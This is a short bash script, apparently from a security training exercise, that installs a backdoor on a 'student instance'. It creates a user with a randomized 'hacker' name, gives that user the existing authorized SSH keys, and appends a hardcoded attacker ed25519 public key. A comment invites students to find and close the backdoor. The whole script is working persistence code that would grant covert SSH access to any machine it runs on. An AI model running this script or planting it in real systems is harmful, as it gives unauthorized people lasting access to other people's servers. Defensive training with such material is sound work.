#!/bin/bash
#
# install a backdoor on the student instance
# If you are reading this, you should have enough information to close it!

if [ ! -z "${WIZPASS:-}" ]; then
   echo -e '\nWelcome Wizard\n'
   exit 0
fi

# Create the hacker user
hacker="hacker${RANDOM}"
sudo adduser --quiet --disabled-password --gecos $hacker $hacker >/dev/null 2>&1
sudo mkdir -p /home/$hacker/.ssh
sudo chmod 700 /home/$hacker/.ssh
sudo chown $hacker:$hacker /home/$hacker/.ssh

# Give the hacker the hacker key
sudo cp /home/ubuntu/.ssh/authorized_keys /home/$hacker/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJf1hjU/vrqVZeNzaJcRhtPO6C5gWdCpEtCwVYmmqeuz $hacker" | sudo tee -a /home/$hacker/.ssh/authorized_keys > /dev/null
sudo chown $hacker:$hacker /home/$hacker/.ssh/authorized_keys
sudo chmod 600 /home/$hacker/.ssh/authorized_keys
